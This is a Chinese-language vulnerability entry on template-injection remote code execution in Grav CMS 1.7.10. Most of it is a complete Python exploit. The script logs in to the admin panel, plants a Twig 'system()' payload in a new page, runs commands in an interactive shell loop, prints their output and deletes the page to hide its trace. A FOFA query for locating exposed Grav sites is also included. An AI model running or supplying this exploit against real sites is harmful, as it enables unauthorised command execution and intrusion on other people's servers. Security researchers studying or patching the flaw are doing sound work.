## Grav CMS 1.7.10 模版注入漏洞

## 漏洞描述

Grav是一套可扩展的用于个人博客、小型内容发布平台和单页产品展示的CMS（内容管理系统）。Grav 存在代码注入漏洞，攻击者可利用该漏洞任意代码执行和提升实例上的特权。

## 漏洞影响

> Grav CMS 1.7.10

## FOFA

> title="Grav"

## POC

PoC.py:

```python
#!/usr/bin/python

import requests
from bs4 import BeautifulSoup
import random
import string


username = 'username'
password = 'password'
url = 'http://grav.local'


session = requests.Session()

# Autheticating
## Getting login-nonce
def login(url,username,password):
  r = session.get(url + "/admin")
  soup = BeautifulSoup(r.text, features="lxml")
  nonce = str(soup.findAll('input')[2])
  nonce = nonce[47:79]

  ## Logging in
  payload =f'data%5Busername%5D={username}&data%5Bpassword%5D={password}&task=login&login-nonce={nonce}'
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  r = session.post(url+"/admin",data=payload,headers=headers)


# Creating Page for RCE

def rce(url,cmd):
  ## Getting form nonce and unique form id
  project_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 8))
  r = session.get(url+f"/admin/pages/{project_name}/:add")
  soup = BeautifulSoup(r.text, features="lxml")
  nonce = str(soup.findAll('input')[72])
  form_id = str(soup.findAll('input')[71])
  form_id = form_id[54:86]
  nonce = nonce[46:78]

  ## Creating Page
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  payload = f'task=save&data%5Bheader%5D%5Btitle%5D={project_name}&data%5Bcontent%5D=%7B%7B+system%28%27{cmd}%27%29+%7D%7D&data%5Bfolder%5D={project_name}&data%5Broute%5D=&data%5Bname%5D=default&data%5Bheader%5D%5Bbody_classes%5D=&data%5Bordering%5D=1&data%5Border%5D=&toggleable_data%5Bheader%5D%5Bprocess%5D=on&data%5Bheader%5D%5Bprocess%5D%5Btwig%5D=1&data%5Bheader%5D%5Border_by%5D=&data%5Bheader%5D%5Border_manual%5D=&data%5Bblueprint%5D=&data%5Blang%5D=&_post_entries_save=edit&__form-name__=flex-pages&__unique_form_id__={form_id}&form-nonce={nonce}&toggleable_data%5Bheader%5D%5Bpublished%5D=0&toggleable_data%5Bheader%5D%5Bdate%5D=0&toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bmetadata%5D=0&toggleable_data%5Bheader%5D%5Bdateformat%5D=0&toggleable_data%5Bheader%5D%5Bmenu%5D=0&toggleable_data%5Bheader%5D%5Bslug%5D=0&toggleable_data%5Bheader%5D%5Bredirect%5D=0&data%5Bheader%5D%5Bprocess%5D%5Bmarkdown%5D=0&toggleable_data%5Bheader%5D%5Btwig_first%5D=0&toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&toggleable_data%5Bheader%5D%5Bchild_type%5D=0&toggleable_data%5Bheader%5D%5Broutable%5D=0&toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&toggleable_data%5Bheader%5D%5Bvisible%5D=0&toggleable_data%5Bheader%5D%5Bdebugger%5D=0&toggleable_data%5Bheader%5D%5Btemplate%5D=0&toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0'
  r = session.post(url+f"/admin/pages/{project_name}/:add",data=payload,headers=headers)

  ## Getting command output
  r = session.get(url+f"/{project_name.lower()}")
  if 'SyntaxError' in r.text:
    print("[-] Command error")
  else:
    a = r.text.split('<section id="body-wrapper" class="section">')
    b = a[1].split('</section>')
    print(b[0][58:])


  # Cleaning up
  ## Getting admin-nonce
  r = session.get(url + "/admin/pages")
  soup = BeautifulSoup(r.text, features="lxml")
  nonce = str(soup.findAll('input')[32])
  nonce = nonce[47:79]

  ## Deleting Page
  r = session.get(url+f"/admin/pages/{project_name.lower()}/task:delete/admin-nonce:{nonce}")

login(url,username,password)

while True:
  cmd = input("$ ")
  rce(url,cmd)
```

